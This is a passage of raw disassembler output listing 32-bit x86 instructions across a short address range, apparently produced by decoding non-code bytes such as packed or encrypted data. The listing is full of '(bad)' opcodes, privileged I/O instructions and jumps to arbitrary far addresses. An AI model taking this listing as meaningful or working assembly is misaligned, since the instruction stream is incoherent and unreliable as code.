  4320b3:	frstor [ecx+ebx*8]
  4320b6:	ficomp WORD PTR [ebx]
  4320b8:	dec    ebx
  4320b9:	sub    DWORD PTR [ebx-0x24603f67],esi
  4320bf:	dec    edx
  4320c0:	inc    esp
  4320c1:	pop    edx
  4320c2:	xor    eax,0xc733e654
  4320c7:	xchg   esi,eax
  4320c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4320c9:	xchg   edx,eax
  4320ca:	loope  0x4320c0
  4320cc:	inc    eax
  4320cd:	and    edi,ecx
  4320cf:	nop
  4320d0:	(bad)  
  4320d1:	mov    cs,WORD PTR [ebp+ebp*2-0x6abcc922]
  4320d8:	cld    
  4320d9:	fstp   TBYTE PTR [edi-0x22f6de12]
  4320df:	clc    
  4320e0:	lds    edx,FWORD PTR [ebx-0x22]
  4320e3:	xor    dh,BYTE PTR [edi-0x31]
  4320e6:	sub    ecx,DWORD PTR [ecx]
  4320e8:	js     0x43211c
  4320ea:	jnp    0x4320c6
  4320ec:	xchg   edx,eax
  4320ed:	mov    ds:0x7738d5c7,eax
  4320f2:	sahf   
  4320f3:	mov    al,0xa
  4320f5:	adc    dh,BYTE PTR [esi-0x10080b4c]
  4320fb:	int3   
  4320fc:	cmc    
  4320fd:	mov    dl,0x41
  4320ff:	jmp    0x4c04168d
  432104:	adc    BYTE PTR [ebx+0x251b98b8],ch
  43210a:	mov    dl,0xaa
  43210c:	in     eax,0x9b
  43210e:	(bad)  
  432110:	xchg   ebp,eax
  432111:	pop    eax
  432112:	jne    0x43210a
  432114:	pop    ebp
  432115:	hlt    
  432116:	lahf   
  432117:	mov    BYTE PTR [ebx+0x5],0xec
  43211b:	stos   BYTE PTR es:[edi],al
  43211c:	repnz cld 
  43211e:	jns    0x432146
  432120:	xchg   esi,eax
  432121:	leave  
  432122:	mov    ebx,0x6ba61bcc
  432127:	mov    edi,0x5ba743e4
  43212c:	dec    esp
  43212d:	and    edx,ecx
  43212f:	add    edi,edi
  432131:	lods   al,BYTE PTR ds:[esi]
  432132:	mov    bl,0xf4
  432134:	jnp    0x43213b
  432136:	mov    ecx,0x64a9e99c
  43213b:	lahf   
  43213c:	mov    esp,0x9504bdab
  432141:	pop    edx
  432142:	cmp    esp,0x4bb5da3
  432148:	jp     0x43215e
  43214a:	imul   edi,DWORD PTR [eiz*2-0x231142e8],0xfffffffa
  432152:	jno    0x43214d
  432154:	pop    ds
  432155:	leave  
  432156:	outs   dx,DWORD PTR ds:[esi]
  432157:	adc    eax,0x50bbdaa4
  43215c:	sti    
  43215d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43215e:	cmp    ecx,DWORD PTR [ecx]
  432160:	push   0x4a949d47
  432165:	push   0xffffffef
  432167:	in     al,0xb2
  432169:	mov    eax,ds:0x5f7ef4b6
  43216e:	in     eax,dx
  43216f:	stos   BYTE PTR es:[edi],al
  432170:	xchg   ebp,eax
  432171:	push   ecx
  432172:	adc    ch,bh
  432174:	div    DWORD PTR [ebx]
  432176:	or     BYTE PTR [ecx+0x16],0x59
  43217a:	push   es
  43217b:	jae    0x432177
  43217d:	dec    ecx
  43217e:	mov    eax,0x5b9cd72b
  432183:	and    edx,edi
  432185:	mov    esi,0xc5404cb
  43218a:	div    al
  43218c:	and    al,0x29
  43218e:	nop
  43218f:	jecxz  0x432147
  432191:	(bad)
  432195:	sub    al,0x1f
  432197:	xchg   esi,eax
  432198:	pop    ecx
  432199:	fwait
  43219a:	xor    BYTE PTR [ecx],dh
  43219c:	cmc    
  43219d:	rcr    cl,0xee
  4321a0:	loop   0x432156
  4321a2:	es out dx,eax
  4321a4:	pop    edi
  4321a5:	arpl   WORD PTR [eax+0x53a83414],di
  4321ab:	(bad)  
  4321ac:	shl    BYTE PTR [edx-0x2aae1385],1
  4321b2:	lods   eax,DWORD PTR ds:[esi]
  4321b3:	cmp    dl,cl
  4321b5:	call   0xac86:0xba1322cf
  4321bc:	jae    0x432165
  4321be:	adc    edx,DWORD PTR [ebp-0x45314d65]
  4321c4:	in     al,0x62
  4321c6:	fld    QWORD PTR [edi]
  4321c8:	dec    esi
  4321c9:	not    BYTE PTR [ebx]
  4321cb:	sbb    DWORD PTR [esi+0x23b2b3a8],edi
  4321d1:	arpl   dx,ax
  4321d3:	mov    edx,DWORD PTR [ecx-0x1]
  4321d6:	mov    dl,0x74
  4321d8:	(bad)  
  4321d9:	mul    bl
  4321db:	js     0x432253
  4321dd:	mov    ah,0xc7
  4321df:	(bad)  
  4321e0:	les    eax,FWORD PTR [eax-0x2c72cf8f]
  4321e6:	mov    ah,0xe8
  4321e8:	pop    ss
  4321e9:	mov    DWORD PTR [edi-0x59e53a18],edi
  4321ef:	loopne 0x4321d1
  4321f1:	mov    ah,0x7b
  4321f3:	fnstenv [esi]
  4321f5:	(bad)  
  4321f6:	(bad)  
  4321f7:	sbb    BYTE PTR ds:0x199b29a7,bh
  4321fd:	xchg   esp,eax
  4321fe:	xor    al,BYTE PTR [ebx-0x1b494265]
  432204:	test   DWORD PTR [ecx-0x302a6c57],ebx
  43220a:	enter  0xa1e7,0x53
  43220e:	cdq    
  43220f:	int    0xfb
  432211:	jmp    0x8b1b:0xc11c5e9e
  432218:	mov    ebp,DWORD PTR [ebx-0x7c2a7894]
  43221e:	nop
  43221f:	jmp    0x43224e
  432221:	shl    ebx,1
  432223:	bound  ebx,QWORD PTR [edi+0x65a166c8]
  432229:	pop    ecx
  43222a:	and    ebx,esp
  43222c:	bound  esi,QWORD PTR [esi+ecx*1]
  43222f:	dec    ebp
  432230:	jae    0x432217
  432232:	mov    bl,0x20
  432234:	and    eax,0xa6e6f006
  432239:	and    DWORD PTR [esi+0x7e9923bc],edx
  43223f:	push   es
  432240:	sub    al,0x9e
  432242:	jp     0x432235
  432244:	iret   
  432245:	lahf   
  432246:	dec    ebx
  432247:	cmp    BYTE PTR [ebx],al
  432249:	mov    cl,0x5b
  43224b:	shl    DWORD PTR [esi],cl
  43224d:	test   BYTE PTR [edx],dh
  43224f:	lds    ecx,FWORD PTR [edi+0x5384bd59]
  432255:	sar    eax,0x3e
  432258:	call   0x7979:0xb5ea33bf
  43225f:	jmp    0x432205
  432261:	pop    ss
  432262:	and    ah,0x85
  432265:	cmp    dh,BYTE PTR [ecx+0x1ba3c806]
  43226b:	pop    ss
  43226c:	test   eax,0xe9c413d0
  432271:	fidiv  DWORD PTR [edi+0x7]
  432274:	and    DWORD PTR [ecx-0x3c],ecx
  432277:	stos   DWORD PTR es:[edi],eax
  432278:	std    
  432279:	add    DWORD PTR [eax],ebx
  43227b:	inc    ebx
  43227c:	push   ebp
  43227d:	lahf   
  43227e:	data16 cld 
  432280:	cmp    DWORD PTR [ebp+0x5ef44ac0],edi
  432286:	add    ch,ah
  432288:	clc    
  432289:	add    eax,0xad9d583c
  43228e:	mov    ebx,0x3e5615dd
  432293:	out    dx,eax
  432294:	or     ecx,ecx
  432296:	xchg   BYTE PTR [edi-0x1eb5a6e9],dl
  43229c:	xor    al,0x3f
  43229e:	xchg   BYTE PTR ds:0x5f9ba7cb,dh
  4322a4:	pop    esi
  4322a5:	sub    eax,DWORD PTR [eax-0x32]
  4322a8:	fmul   QWORD PTR [ebx+0x66]
  4322ab:	aam    0x7f
  4322ad:	jmp    0x432263
  4322af:	push   esp
  4322b0:	outs   dx,DWORD PTR ds:[esi]
  4322b1:	push   0xffffffa9
  4322b3:	mov    eax,ds:0xecfcb9f5
  4322b8:	ucomiss xmm6,xmm0
  4322bb:	shl    DWORD PTR [ecx],0x29
  4322be:	jle    0x4322fa
  4322c0:	(bad)  
  4322c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4322c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4322c3:	addr16 sub al,0x9a
  4322c6:	or     edx,ebp
  4322c8:	loopne 0x43232c
  4322ca:	out    dx,eax
  4322cb:	mov    eax,0x15ca311
  4322d0:	xchg   ecx,eax
  4322d1:	adc    al,0x20
  4322d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4322d4:	mul    DWORD PTR [edx-0x21f45c6f]
  4322da:	xchg   BYTE PTR [esi-0x7a],al
  4322dd:	lds    esp,FWORD PTR [ebx+0x64af7561]
  4322e3:	mov    eax,0x306f9e87
  4322e8:	mov    edi,0x98429a86
  4322ed:	icebp  
  4322ee:	mov    ebx,0x87dc03f4
  4322f3:	mov    eax,0xf31f9525
  4322f8:	mov    ?,esi
  4322fa:	ss mov ecx,fs
  4322fd:	cmp    edi,DWORD PTR [ebp+0x76]
  432300:	and    bh,BYTE PTR [ecx-0x75]
  432303:	push   0xffffffd0
  432305:	outs   dx,BYTE PTR ds:[esi]
  432306:	cwde   
  432307:	rol    al,cl
  432309:	mov    ds:0x26e5f03b,al
  43230e:	jne    0x4322ae
  432310:	ins    BYTE PTR es:[edi],dx
  432311:	lods   eax,DWORD PTR ds:[esi]
  432312:	mov    edi,gs
  432314:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432315:	xor    eax,0xb18924b2
  43231a:	inc    edi
  43231b:	arpl   bp,si
  43231d:	test   DWORD PTR [eax+0x77322ee9],esi
  432323:	dec    esi
  432324:	pop    ds
  432325:	test   eax,0x292fa0fc
  43232a:	cs test al,0x80
  43232e:	dec    ebp
  43232f:	adc    al,0x52
  432331:	pushf  
  432332:	stos   DWORD PTR es:[edi],eax
  432333:	(bad)
  432336:	push   es
  432337:	xchg   ebp,eax
  432338:	cmp    edi,DWORD PTR [edx]
  43233a:	pop    esp
  43233b:	mov    ecx,0x2e34e9fd
  432340:	in     eax,dx
  432341:	aam    0xb9
  432343:	call   0x8ce07ca8
  432348:	leave  
  432349:	sahf   
  43234a:	daa    
  43234b:	inc    edi
  43234c:	sbb    dl,bh
  43234e:	or     ebx,ebx
  432350:	and    BYTE PTR [ecx-0x193e592f],bh
  432356:	sub    DWORD PTR [ebp+0x230ba891],esi
  43235c:	inc    edi
  43235d:	push   edi
  43235e:	les    esp,FWORD PTR [ebx+0x39397c51]
  432364:	sub    al,cl
  432366:	mov    ch,0x94
  432368:	sbb    eax,0x554487f2
  43236d:	mov    eax,ds:0x7bf66d0b
  432372:	ss call 0x276f:0xe04e34b
  43237a:	mov    eax,0xf23bafe4
  43237f:	ret    
  432380:	push   ss
  432381:	mov    bh,0x62
  432383:	retf   
  432384:	sbb    ch,BYTE PTR [ecx+0x26f800c4]
  43238a:	out    0x42,al
  43238c:	and    ebp,DWORD PTR [ebx-0x13]
  43238f:	test   BYTE PTR [edx],bl
  432391:	and    al,0x48
  432393:	ins    DWORD PTR es:[edi],dx
  432394:	retf   
  432395:	(bad)  
  432396:	sbb    al,0x70
  432398:	cmp    eax,0x22582b9c
  43239d:	cmp    BYTE PTR [ecx-0xc15179b],bl
  4323a3:	jge    0x43232f
  4323a5:	pop    ecx
  4323a6:	push   ecx
  4323a7:	aaa    
  4323a8:	pop    ss
  4323a9:	lods   al,BYTE PTR ds:[esi]
  4323aa:	enter  0xe01e,0x24
  4323ae:	stos   DWORD PTR es:[edi],eax
  4323af:	pop    edi
  4323b0:	gs pop eax
  4323b2:	(bad)  
  4323b3:	in     al,dx
  4323b4:	xlat   BYTE PTR ds:[ebx]
  4323b5:	call   0x89d28af6
  4323ba:	push   ecx
  4323bb:	mov    ds:0x9abf4e7a,eax
  4323c0:	xor    DWORD PTR [eax-0x46],ebx
  4323c3:	not    DWORD PTR [esi-0x33d90973]
  4323c9:	sahf   
  4323ca:	and    DWORD PTR [esi+0x4de1f85d],0x4
  4323d1:	cmp    eax,0xd25ad4bc
  4323d6:	mov    bl,BYTE PTR [eax+0x25]
  4323d9:	xor    al,0xf0
  4323db:	jmp    0x432389
  4323dd:	in     al,0x53
  4323df:	addr16 xchg ebx,eax
  4323e1:	stc    
  4323e2:	ds xchg ecx,eax
  4323e4:	cwde   
  4323e5:	out    dx,al
  4323e6:	inc    edx
  4323e7:	xor    edx,DWORD PTR [edi]
  4323e9:	mov    eax,ds:0x1cbb55f2
  4323ee:	outs   dx,DWORD PTR ds:[esi]
  4323ef:	xor    DWORD PTR [edx],esp
  4323f1:	mov    cl,0xc
  4323f3:	out    0x45,eax
  4323f5:	mov    fs,WORD PTR [esi+0x67191d2b]
  4323fb:	sbb    BYTE PTR [edx+0x40bc07c8],al
  432401:	bound  esi,QWORD PTR [ecx-0x3f]
  432404:	sbb    cl,BYTE PTR [ecx]
  432406:	mov    edx,0xc52e4357
  43240b:	push   ecx
  43240c:	push   ds
  43240d:	cmp    DWORD PTR [ebp-0x5bb978d1],ebx
  432413:	fisttp DWORD PTR [eax]
  432415:	(bad)  
  432416:	std    
  432417:	add    edx,DWORD PTR [edi+eiz*2+0x1e]
  43241b:	div    BYTE PTR [ebp-0x68]
  43241e:	mov    al,ds:0x929dc5fa
  432423:	ja     0x432441
  432425:	jmp    0xe18cdf66
  43242a:	addr16 jae 0x4324aa
  43242d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43242e:	stos   DWORD PTR es:[edi],eax
  43242f:	jge    0x43249d
  432431:	add    al,0x93
  432433:	cs sti 
  432435:	mov    ebx,0x193b1389
  43243a:	inc    esi
  43243b:	and    eax,0xdb532935
  432440:	ins    BYTE PTR es:[edi],dx
  432441:	and    eax,0x991d3ad9
  432446:	je     0x4323ff
  432448:	dec    edx
  432449:	inc    edx
  43244a:	gs jecxz 0x4324b7
  43244d:	nop
  43244e:	scas   eax,DWORD PTR es:[edi]
  43244f:	(bad)  
  432450:	sbb    eax,0xd0348a71
  432455:	loop   0x4324c2
  432457:	and    eax,0xee30721f
  43245c:	xchg   esp,eax
  43245d:	mov    eax,ds:0xb613ee2b
  432462:	mov    ds:0x75bbb357,eax
  432467:	cmp    edi,DWORD PTR [ecx]
  432469:	dec    ebx
  43246a:	mov    eax,0x9638e324
  43246f:	(bad)  
  432470:	xchg   ebp,eax
  432471:	in     al,0xc4
  432473:	call   0xb168cacc
  432478:	sbb    ecx,ecx
  43247a:	fwait
  43247b:	(bad)  
  43247c:	lock mov bh,0xaa
  43247f:	and    esp,ebp
  432481:	popf   
  432482:	mov    edx,DWORD PTR [edx+0x5f08dc49]
  432488:	out    dx,eax
  432489:	sub    eax,DWORD PTR [ebx]
  43248b:	fwait
  43248c:	in     eax,dx
  43248d:	into   
  43248e:	(bad)  
  43248f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432490:	mov    ebp,0x2c62ebc4
  432495:	cs jg  0x4324bc
  432498:	sbb    dh,BYTE PTR [ecx-0x5]
  43249b:	mov    edi,0xd4070773
  4324a0:	fisubr WORD PTR [edx+edi*2+0x3b9255d]
  4324a7:	pop    eax
  4324a8:	inc    ecx
  4324a9:	fcomp  st(6)
  4324ab:	and    al,0xaa
  4324ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4324ae:	dec    ebx
  4324af:	inc    edi
  4324b0:	test   BYTE PTR [ebp-0x7a],dl
  4324b3:	mov    BYTE PTR [edx+0x7c6aabac],cl
  4324b9:	cli    
  4324ba:	mov    bl,0x43
  4324bc:	pop    ds
  4324bd:	sub    DWORD PTR [edx-0x3bcb5b81],ebp
  4324c3:	xor    DWORD PTR [ebp+0x3ae60417],esi
  4324c9:	call   0xb96b49a5
  4324ce:	(bad)  
  4324cf:	loope  0x43253d
  4324d1:	jae    0x432502
  4324d3:	and    BYTE PTR cs:[esp+eax*4+0x5a],ch
  4324d8:	test   DWORD PTR [edi],edx
  4324da:	mov    ecx,0xb1c2e4ea
  4324df:	(bad)
  4324e4:	mov    esi,0xf14841eb
  4324e9:	xor    DWORD PTR [ecx+0x7d3d66fa],esi
  4324ef:	leave  
  4324f0:	and    BYTE PTR ds:0xadb1423a,ch
  4324f6:	fst    QWORD PTR [esi-0x6b4be879]
  4324fc:	jb     0x4324f8
  4324fe:	pop    edx
  4324ff:	fdivr  st(6),st
  432501:	inc    ecx
  432502:	adc    al,0x21
  432504:	icebp  
  432505:	mov    ds:0x394c1b94,al
  43250a:	xor    BYTE PTR [ecx+ebp*1-0x67cb42c9],dl
  432511:	fcmovb st,st(2)
  432513:	cmp    BYTE PTR [esi],dl
  432515:	jae    0x4324f2
  432517:	or     esi,ebp
  432519:	dec    ebp
  43251a:	xlat   BYTE PTR ds:[ebx]
  43251b:	xchg   ecx,eax
  43251c:	mov    bl,0xa4
  43251e:	mov    bl,0x62
  432520:	xchg   ebx,eax
  432521:	fild   QWORD PTR [ebx]
  432523:	push   ebp
  432524:	push   ss
  432525:	xor    bh,bl
  432527:	sbb    DWORD PTR [eax],esp
  432529:	sbb    ch,0xf
  43252c:	cmp    DWORD PTR [ecx+0x5a6a2e43],ebp
  432532:	out    0xba,eax
  432534:	push   esp
  432535:	cmp    ch,BYTE PTR [esi-0x45f41253]
  43253b:	mov    ah,0x52
  43253d:	sti    
  43253e:	jno    0x4324c6
  432540:	mov    ch,0x16
  432542:	repz in al,0xc
  432545:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432546:	inc    eax
  432547:	cwde   
  432548:	mov    al,0xe9
  43254a:	mov    ah,0x53
  43254c:	add    eax,0x8b6bc499
  432551:	inc    edi
  432552:	push   0xfffffff3
  432554:	push   0xd8447f21
  432559:	int    0x22
  43255b:	xor    dl,bl
  43255d:	xor    BYTE PTR [esi+0x49d856d4],0xa
  432564:	cli    
  432565:	retf   
  432566:	mov    dh,0x24
  432568:	gs inc ecx
  43256a:	sbb    BYTE PTR [ecx],bl
  43256c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43256d:	push   edi
  43256e:	fcomp  DWORD PTR ds:0xcf18814d
  432574:	fldenv [edx]
  432576:	xor    al,0xaf
  432578:	cmp    cl,dl
  43257a:	mov    ecx,0x742d4ae4
  43257f:	cmp    esp,DWORD PTR [esi-0x6dff0496]
  432585:	popf   
  432586:	in     al,0x6f
  432588:	xor    ah,BYTE PTR [edx-0x15428f4f]
  43258e:	mov    ah,0x24
  432590:	jbe    0x432578
  432592:	aam    0x41
  432594:	push   ebp
  432595:	das    
  432596:	push   esp
  432597:	in     eax,0xe3
  432599:	(bad)  
  43259a:	dec    esi
  43259b:	cmp    al,0x18
  43259d:	dec    ecx
  43259e:	xchg   BYTE PTR [ebx-0x79],dl
  4325a1:	jg     0x4325e8
  4325a3:	mov    al,0x20
  4325a5:	mov    al,ds:0xb98b2aab
  4325aa:	shr    BYTE PTR [esp+ebx*1-0x63],0x2a
  4325af:	mov    ds,WORD PTR [ecx]
  4325b1:	or     DWORD PTR [esi-0x2d],edi
  4325b4:	aaa    
  4325b5:	aad    0x59
  4325b7:	xor    al,0xfe
  4325b9:	test   al,0xfb
  4325bb:	fisubr DWORD PTR [edx]
  4325bd:	xchg   ebx,eax
  4325be:	jo     0x4325c0
  4325c0:	lods   eax,DWORD PTR ds:[esi]
  4325c1:	pop    ss
  4325c2:	mov    eax,ds:0xe9ae7828
  4325c7:	in     al,0x54
  4325c9:	popf   
  4325ca:	ror    DWORD PTR [ebx+eiz*1+0x60b71d18],cl
  4325d1:	push   edx
  4325d2:	int3   
  4325d3:	clc    
  4325d4:	daa    
  4325d5:	sub    DWORD PTR [ecx+0x825872d],edx
  4325db:	imul   esp,DWORD PTR [ecx+edi*8],0x9eb3a436
  4325e2:	lea    esp,[ecx-0x6ad45be3]
  4325e8:	adc    BYTE PTR [eax+0x15],al
  4325eb:	adc    al,0x3e
  4325ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4325ee:	mov    dl,0xc8
  4325f0:	mov    BYTE PTR [ecx-0x50],al
  4325f3:	je     0x4325c0
  4325f5:	addr16 clc 
  4325f7:	(bad)  
  4325f8:	mov    dh,0xd6
  4325fa:	and    DWORD PTR [ecx],esp
  4325fc:	inc    ebx
  4325fd:	stc    
  4325fe:	mov    ch,0x76
  432600:	mov    cl,0x93
  432602:	mov    esi,0x7743beaf
  432607:	out    0xc3,eax
  432609:	inc    ecx
  43260a:	mov    cl,0x44
  43260c:	mov    edi,0xe1b2db9b
  432611:	sub    al,0xae
  432613:	xchg   edx,eax
  432614:	push   ecx
  432615:	adc    al,0x41
  432617:	int    0x91
  432619:	das    
  43261a:	mov    edx,0xdc8ce604
  43261f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432620:	std    
  432621:	popf   
  432622:	dec    ebx
  432623:	adc    edx,0x854b4145
  432629:	out    0x39,al
  43262b:	and    eax,0x14b3a608
  432630:	(bad)  
  432631:	repnz xchg edx,eax
  432633:	push   ebp
  432634:	xchg   esi,eax
  432635:	and    al,0x79
  432637:	and    edx,ecx
  432639:	ret    
  43263a:	scas   al,BYTE PTR es:[edi]
  43263b:	sti    
  43263c:	sbb    dl,BYTE PTR [eax+0x38]
  43263f:	pmulhw mm5,mm5
  432642:	mov    esp,0xf7521064
  432647:	stc    
  432648:	inc    ebp
  432649:	and    DWORD PTR [ebp+0x5c5b2eb],ecx
  43264f:	lea    eax,[ebx+0x39]
  432652:	leave  
  432653:	enter  0xe4c0,0x2b
  432657:	mov    ebp,0xf1807e9b
  43265c:	test   eax,0x17cbbcdf
  432661:	ss mov ecx,0x4d6999c
  432667:	push   ebp
  432668:	stc    
  432669:	pop    ebx
  43266a:	xor    al,BYTE PTR [esi+edi*8+0x29]
  43266e:	xor    DWORD PTR [ebx-0x10faf77b],edx
  432674:	mov    edx,0xe2464ba4
  432679:	mov    fs,WORD PTR [esi+0x1ea13c17]
  43267f:	bnd ret 0xb201
  432683:	xor    al,0xa9
  432685:	mov    bh,0xfa
  432687:	mov    dl,0x75
  432689:	cdq    
  43268a:	retf   
  43268b:	test   BYTE PTR [ecx],cl
  43268d:	into   
  43268e:	jnp    0x43266a
  432690:	fwait
  432691:	and    DWORD PTR [edx+0x34],ebx
  432694:	call   0x1cd0:0x2632f0fd
  43269b:	jecxz  0x4326cb
  43269d:	jns    0x4326db
  43269f:	xchg   ebp,eax
  4326a0:	sbb    ebp,ecx
  4326a2:	fsubr  st,st(0)
  4326a4:	lea    ebp,[ebx-0x400a378e]
  4326aa:	xchg   ah,ch
  4326ac:	sbb    DWORD PTR [ecx],0x40
  4326af:	les    ebx,FWORD PTR [edx]
  4326b1:	jns    0x4326bf
  4326b3:	cmp    bl,ah
  4326b5:	imul   eax,edi,0x66
  4326b8:	scas   eax,DWORD PTR es:[edi]
  4326b9:	(bad)  
  4326ba:	in     eax,dx
  4326bb:	push   edi
  4326bc:	inc    edi
  4326bd:	into   
  4326be:	idiv   DWORD PTR ds:0xafb9c4b5
  4326c4:	ins    DWORD PTR es:[edi],dx
  4326c5:	adc    eax,0x15b3fff2
  4326ca:	or     dl,dh
  4326cc:	sbb    edi,ecx
  4326ce:	mov    esp,0xb453201d
  4326d3:	or     BYTE PTR [esi],al
  4326d5:	ins    DWORD PTR es:[edi],dx
  4326d6:	out    dx,eax
  4326d7:	pop    ds
  4326d8:	sbb    ch,BYTE PTR [ecx-0x29]
  4326db:	mov    WORD PTR [ecx-0x67],?
  4326de:	or     DWORD PTR [ecx+0x1a],esi
  4326e1:	imul   edx,DWORD PTR [ecx-0x37213562],0x7b9e2a55
  4326eb:	jmp    0x4326d7
  4326ed:	fcmovbe st,st(7)
  4326ef:	xlat   BYTE PTR ds:[ebx]
  4326f0:	cmp    BYTE PTR [edx+0x54c572d3],0xb3
  4326f7:	fs scas al,BYTE PTR es:[edi]
  4326f9:	out    dx,eax
  4326fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4326fb:	aam    0xf8
  4326fd:	inc    ebx
  4326fe:	fimul  DWORD PTR [edi-0x4a]
  432701:	(bad)  
  432702:	pushf  
  432703:	bound  edx,QWORD PTR [edi+ebx*8+0x60]
  432707:	jmp    0x43272c
  432709:	cdq    
  43270a:	dec    edx
  43270b:	cmc    
  43270c:	push   0x7b
  43270e:	in     eax,0xb2
  432710:	test   eax,0xee28dd95
  432715:	popf   
  432716:	bsr    eax,DWORD PTR [eax-0x8]
  43271a:	bound  ebp,QWORD PTR [esp+edi*1+0x10]
  43271e:	xor    DWORD PTR [ebp-0x5],edi
  432721:	shl    BYTE PTR [edi+edx*1+0x27],0x51
  432726:	retf   0x1bf4
  432729:	add    DWORD PTR [esi-0x1f],eax
  43272c:	stos   DWORD PTR es:[edi],eax
  43272d:	pop    esi
  43272e:	sahf   
  43272f:	or     edx,esp
  432731:	add    BYTE PTR [edi-0x34670d75],0x34
  432738:	inc    eax
  432739:	imul   esi,DWORD PTR [ecx],0xbb999eb4
  43273f:	pop    edx
  432740:	aaa    
  432741:	and    DWORD PTR ds:0xc8e1d174,0xffffff8f
  432748:	sbb    cl,BYTE PTR [edi-0x76c87b50]
  43274e:	int    0xbe
  432750:	jne    0x43273b
  432752:	and    al,0xef
  432754:	jmp    0xbb79:0x1d1d4b04
  43275b:	inc    esi
  43275c:	or     BYTE PTR [ebp-0x5efe1cf9],0xb
  432763:	dec    edx
  432764:	mov    esi,0xe1ec7bde
  432769:	test   al,0x6d
  43276b:	mov    eax,ds:0xec51c933
  432770:	xchg   esp,eax
  432771:	xchg   ebp,eax
  432772:	outs   dx,BYTE PTR ds:[esi]
  432773:	pmulhw mm4,mm6
  432776:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432777:	xchg   esp,eax
  432778:	add    eax,0x46ec7fbf
  43277d:	mov    eax,ds:0xe9164781
  432782:	stos   DWORD PTR es:[edi],eax
  432783:	and    eax,0xda879c32
  432788:	repz loope 0x432738
  43278b:	(bad)  
  43278c:	outs   dx,BYTE PTR ds:[esi]
  43278d:	mov    WORD PTR [ecx+ebx*4],?
  432790:	dec    ebx
  432791:	jmp    FWORD PTR [esi]
  432793:	push   es
  432794:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432795:	aam    0xa3
  432797:	pop    ss
  432798:	sbb    BYTE PTR [ecx+0x58],cl
  43279b:	cmp    ebx,DWORD PTR [ecx+0x5f59ad82]
  4327a1:	fwait
  4327a2:	jnp    0x432796
  4327a4:	cmp    eax,0x845cfa91
  4327a9:	test   al,0x30
  4327ab:	adc    BYTE PTR [esi+0x1c852c3d],bl
  4327b1:	js     0x432742
  4327b3:	or     ecx,DWORD PTR [ecx-0xa104462]
  4327b9:	cmc    
  4327ba:	clc    
  4327bb:	jl     0x4327f1
  4327bd:	loope  0x432783
  4327bf:	frstor [eax]
  4327c1:	push   es
  4327c2:	lods   eax,DWORD PTR ds:[esi]
  4327c3:	gs popa 
  4327c5:	lds    ecx,FWORD PTR ds:0x21260be8
  4327cb:	sub    ebx,edx
  4327cd:	sbb    ebx,eax
  4327cf:	adc    eax,0xda4611b
  4327d4:	lea    ebx,[esi+0x4c1e2708]
  4327da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4327db:	xchg   ebp,eax
  4327dc:	addr16 aaa 
  4327de:	loop   0x4327c4
  4327e0:	sbb    eax,0x84aa4ba8
  4327e5:	(bad)
  4327e8:	pushf  
  4327e9:	dec    ebp
  4327ea:	and    ch,BYTE PTR [ecx]
  4327ec:	std    
  4327ed:	scas   al,BYTE PTR es:[edi]
  4327ee:	sub    dl,BYTE PTR [ebp+0x55ff351f]
  4327f4:	fild   DWORD PTR [ecx+0x6703a27d]
  4327fa:	pop    es
  4327fb:	cmp    esi,DWORD PTR [ebp-0x74031aac]
  432801:	mov    ds:0xea3ac819,eax
  432806:	fbstp  TBYTE PTR [edx-0x6c459fd]
  43280c:	std    
  43280d:	les    esp,FWORD PTR ds:0xc125a17
  432813:	and    al,0xd9
  432815:	jmp    0x4af2c096
  43281a:	sbb    ah,bh
  43281c:	clc    
  43281d:	test   eax,0x9ebf8c24
  432822:	jnp    0x432805
  432824:	in     al,0x81
  432826:	arpl   WORD PTR [edi-0xd0a667b],di
  43282c:	aaa    
  43282d:	not    esp
  43282f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432830:	rol    eax,1
  432832:	dec    ebx
  432833:	or     ah,BYTE PTR ds:0x394ebe1
  432839:	sub    DWORD PTR [ebx+0x4bbda21e],ebp
  43283f:	orps   xmm2,XMMWORD PTR [edx-0xab98bad]
  432846:	add    al,0x56
  432848:	mov    ch,0xa7
  43284a:	ret    0x216e
  43284d:	imul   edx,DWORD PTR [edi-0xf54f2fe],0x5ba52ac6
  432857:	mov    dl,0xa8
  432859:	pusha  
  43285a:	mov    cl,0x13
  43285c:	arpl   WORD PTR [edx],bx
  43285e:	mov    ebx,0x57591e6d
  432863:	dec    esp
  432864:	sbb    al,0xd3
  432866:	dec    ebp
  432867:	push   0xb8aba336
  43286c:	jl     0x43285b
  43286e:	sbb    eax,0x9392e21c
  432873:	xchg   ebp,eax
  432874:	pushf  
  432875:	or     al,0xa1
  432877:	dec    esp
  432878:	cmc    
  432879:	sbb    eax,0xa6bde7eb
  43287e:	mov    ch,0xf6
  432880:	pop    ecx
  432881:	pop    es
  432882:	sti    
  432883:	fs inc ecx
  432885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432886:	mov    bh,0xc
  432888:	out    0xc9,eax
  43288a:	aad    0xfd
  43288c:	sbb    DWORD PTR [edi-0x523fb420],esi
  432892:	jno    0x43290a
  432894:	mov    esp,0x7b48b721
  432899:	fcmovnb st,st(3)
  43289c:	hlt    
  43289d:	gs (bad) 
  43289f:	mov    ecx,DWORD PTR [ebx]
  4328a1:	cmp    eax,0x60a9f232
  4328a6:	mov    esp,0x8af40374
  4328ab:	jbe    0x4328b1
  4328ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4328ae:	sub    eax,DWORD PTR [ebp+0x6e]
  4328b1:	std    
  4328b2:	inc    eax
  4328b3:	add    ch,al
